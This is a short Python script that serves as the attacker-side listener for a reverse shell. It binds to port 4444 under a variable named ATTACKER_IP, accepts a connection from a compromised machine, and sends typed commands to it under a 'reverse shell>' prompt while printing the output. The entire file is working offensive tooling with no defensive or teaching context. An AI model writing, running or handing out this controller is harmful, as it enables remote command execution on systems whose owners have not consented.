import socket

ATTACKER_IP = '172.23.235.176'
ATTACKER_IP = '0.0.0.0'
ATTACKER_PORT = 4444
BUFFER_SIZE = 1024

# create socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ATTACKER_IP, ATTACKER_PORT))

# listen and accept connections
server.listen(1)
client_socket, client_address = server.accept()
print(f"Connected to {client_address}")

# send commands
while True:
    command = input("reverse shell> ")
    if command.lower() == 'exit':
        client_socket.send(b'exit')
        client_socket.close()
        break

    client_socket.send(command.encode())
    response = client_socket.recv(BUFFER_SIZE).decode()
    print(response)
